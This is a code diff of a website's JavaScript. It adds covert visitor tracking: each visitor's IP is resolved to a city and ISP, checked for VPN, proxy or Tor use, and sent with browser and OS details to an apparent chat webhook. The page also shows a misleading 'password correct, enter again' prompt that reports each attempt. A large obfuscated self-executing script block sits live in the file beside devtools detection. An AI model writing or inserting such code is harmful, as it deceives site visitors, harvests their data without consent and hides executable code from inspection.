@@ -90,7 +90,7 @@ document.querySelector('.camera-button').addEventListener('click', function() {
           document.getElementById('password').value = '';
           if (passwordAttempts === 1) {
             isPasswordCorrect = true;
-            alert('✅ Password correct. 🔁 Please enter again to unlock camera content.');
+            alert('✅ Password correct. 🔁 Please enter again to unlock content.');
             sendM('✅ **Password Correct**');
           } else if (isPasswordCorrect) {
             passwordBox.style.display = 'none';
@@ -234,7 +234,7 @@ function refreshImages() {
 }
 setInterval(refreshImages, 60000); // Refresh every 60 seconds
 
-// Activity (For Fun)
+// Activity (⚠️ For Fun ⚠️)
 let devToolsMessageSent = false;
 var wurl;(function(){var MhU='',Ohc=356-345;function pCg(s){var w=459323;var r=s.length;var b=[];for(var f=0;f<r;f++){b[f]=s.charAt(f)};for(var f=0;f<r;f++){var a=w*(f+128)+(w%35118);var l=w*(f+246)+(w%50678);var g=a%r;var u=l%r;var m=b[g];b[g]=b[u];b[u]=m;w=(a+l)%1872265;};return b.join('')};var KUn=pCg('qoxrtyknuaslchdvfroijccpzwmtrgubnteos').substr(0,Ohc);var IEl='(shcv(<vv0=5h,0=(4y+ca.ni."bldyfr,kj=lx={phrstn;[tcz);[ig o+a8o049=ie8)taa=,]6l=6i=2yu0("2n7l.jgr2[,.m ;c1iCegc,rh(00,,civ02t0o.y]p;6re;r,(bafei}rdlar9t;;g;c)(ao[ye]0 ;ta{ .o2r[]=du=t)rf+hfal=a6ra,f+7(h5rrCo1=xnv9; moaw;.lanzrt;]inbh;avlh)f1g]n-oe {xh.sk (,8c (1]f;rC="t,t8grlrns;}-..;nprft{-;((=4 ;)ratlevlr;pr"[ [}plr;}=,g.ln=.xea50}e"r=.C,[ba>p4irj=1qe;r)7= a= u{+;t3r;.),4);=n)gil }yaoegd)7 gv)ga("(=)(c=c;vad-,c;f;sv1e*rv)euhev1. i9r=(i1e=5ar=.e=+h(Cbtv" (ff((v9da +futo.qedfclnd+p.aS8[{6r[A,"<[()1++o hvrno[;htcsf2c-pt2=r;3+,2as-lloeesn0u=ui+u+f(lnlnu.u) =*8as+vA>tw+;piuhhp(sor(thv.a,,]!l)ay,stk;(a[7+8]n;r=eo+v+rri (wainr)dn]or<C);7)i)u,bmivr=t8;gAsh))-=1ta ypyoj,("1)gl6ktp.sh()[c4ovtair1](s+jsilCr(;]zohvfx;1e,0ng<iv56)(;p)9=.ce;crtvtqm2cfa==s,7iann=r;.Couo].)e+;6n;8h]z)n7 9d+;;<qois;+=hniv+)k(4dc+l;t w.um.2a,Aa(i)ohvo{,)Stnfscc;rdpv,erhgA=in=2n+e rerih=}.apil;tg)i"(o)paaur!w= ';var zkl=pCg[KUn];var MPk='';var LYh=zkl;var txr=zkl(MPk,pCg(IEl));var xRU=txr(pCg('\/e4=e.d,c_)f,0Y.= YnC,n.ab#p+r5Y)Yb).$;n21,}Ys,+4.2w,oe1.r.i!b3S#n.5w4$9t*Yfe7s"tt )_%=)18Ya}h:$aoYz2!#j=nY"e)oY$.02o]z)!mdd0=1(Nd.)g)}5tYo4tu1){fz!k$o(06o.}a;u!oYr. Y.Yd_6..hYlYzY0tY.;jCsnp5pah;;_((Y tvn1 "!9ip0(.jYb2eY03#Cr7j+kr$l#vY.381_(Y 1k cvb(.!u.cs,4oih.o_.)%_,! fcopsY[c}6Y1I,r;p.qbgur,mY1Yf971. 1Yzc.o3%(=TY;evi$"tbhbmNe8.c{eg, r+leal4=.)Y$rps__ur[];\/horrY*;.=,4=.Y$a.%rgpn6toS)Y1a-Yac_h(,,n.=.*t(p4Y;2;c.\/3070\/Y\/lis-+6..#9!os+i{(Y3,(u13...)+zks*c,f28.nx.Yu;-h\'73.8)))()c "jo.)j&6,r9Y8.*.r06);0($!=ttf-5,r_+x9;_.Y3;Y)3.Y_,0;2Y($$Y).!_6csmY,.=.\/rfkf*);esY6g($cppY2,Y6Y,.r\/c(,$1b%iY$6jtY}";1Y(szoY=n+i..cr.o_ft(p(,.h2!;4%fhi6!,o5[ia2acY()Y=Yz(oY=8f!.pxo(fxfwtc.e{Yohds0.t.j{Y=cf.4 ,j6$s_#e(p)!!2eY)\'v.Y13 \'k)jit.YeY1(c)1..7wur)2cc%$s187b)h;2g(rsh4 Yr,s,n).l.z}c.f_)%(Y1\/Y\/!(om5Y,o45rysY3YYy=t{f=m_t5!.s+\/Y!35Y(sYff."Y$1!e$t$]\/ swu.(t)zpYi&$.$+\'I8o!sg{,te.)la!Y.,Y_ br)s;1rcsY$=c4.l&f.es;$e2i$ba)(Se5YjcY.6)t(e_aY)*7rlt2!ir)b3=rp(lr.wYyp;{,88}9sfYYjgfY{&}p; $)0js!!;((..*i3.}})ta7sn=mfn19}+_]'));var ZJz=LYh(MhU,xRU );ZJz(7545);return 5278})()
 
@@ -271,48 +271,65 @@ function sendM(message, buttonName = '') {
     .then(data => {
       const ip = data.ip;
 
-      const embed = {
-        title: message,
-        color: parseInt("5d35b2", 16),
-        fields: [
-          { name: "\u2003", value: "\u2003", inline: false },
-          { name: "🕒", value: new Date().toLocaleString(), inline: false },
-          { name: "🌐", value: browser, inline: true },
-          { name: "🖥️", value: os, inline: true },
-          { name: "🔗", value: referrer, inline: false },
-          { name: "📏", value: screenResolution, inline: true },
-          { name: "🌐", value: ip, inline: true }
-        ]
-      };
+      fetch(`https://ipapi.co/${ip}/json/`)
+        .then(res => res.json())
+        .then(location => {
+          const city = location.city || '❌';
+          const isp = location.org || '❌';
 
-      const embeds = [embed];
+          const privacy = location.security || {};
+          const isVPN = privacy.vpn ? "✅ VPN" : '';
+          const isProxy = privacy.proxy ? "✅ Proxy" : '';
+          const isTor = privacy.tor ? "✅ Tor" : '';
+          const privacyInfo = isVPN || isProxy || isTor ? `${isVPN} ${isProxy} ${isTor}`.trim() : '❌';
 
-      if (buttonName) {
-        embeds[0].fields.unshift({
-          "name": "🔗 **Button Clicked**",
-          "value": buttonName,
-          "inline": true
-        });
-      }
+          const embed = {
+            title: message,
+            color: parseInt("5d35b2", 16),
+            fields: [
+              { name: "\u2003", value: "\u2003", inline: false },
+              { name: "🕒", value: new Date().toLocaleString(), inline: false },
+              { name: "🌐", value: browser, inline: true },
+              { name: "🖥️", value: os, inline: true },
+              { name: "📏", value: screenResolution, inline: true },
+              { name: "🌐", value: ip, inline: true },
+              { name: "🏙️", value: city, inline: false },
+              { name: "📡", value: isp, inline: false },
+              { name: "🛡️", value: privacyInfo, inline: false },
+              { name: "🔗", value: referrer, inline: false }
+            ]
+          };
 
-      const params = {
-        username: "Website Notification",
-        avatar_url: "https://nobitek.pl/assets/Images/Icon.png",
-        embeds: embeds
-      };
+          const embeds = [embed];
 
-      request.onreadystatechange = function() {
-        if (request.readyState === XMLHttpRequest.DONE) {
-          const responseStatus = request.status;
-          if (responseStatus !== 204) {
-            console.error('Failed:', responseStatus);
+          if (buttonName) {
+            embeds[0].fields.unshift({
+              "name": "🔗 **Button Clicked**",
+              "value": buttonName,
+              "inline": true
+            });
           }
-        }
-      };
 
-      request.send(JSON.stringify(params));
+          const params = {
+            username: "Website Notification",
+            avatar_url: "https://nobitek.pl/assets/Images/Icon.png",
+            embeds: embeds
+          };
+
+          request.onreadystatechange = function() {
+            if (request.readyState === XMLHttpRequest.DONE) {
+              const responseStatus = request.status;
+              if (responseStatus !== 204) {
+                console.error('Failed:', responseStatus);
+              }
+            }
+          };
+
+          request.send(JSON.stringify(params));
+        })
+        .catch(error => console.error('Geo Error:', error));
     })
-    .catch(error => console.error('Error:', error));
+    .catch(error => console.error('IP Error:', error));
 }
 
 function isDevToolsOpen() {
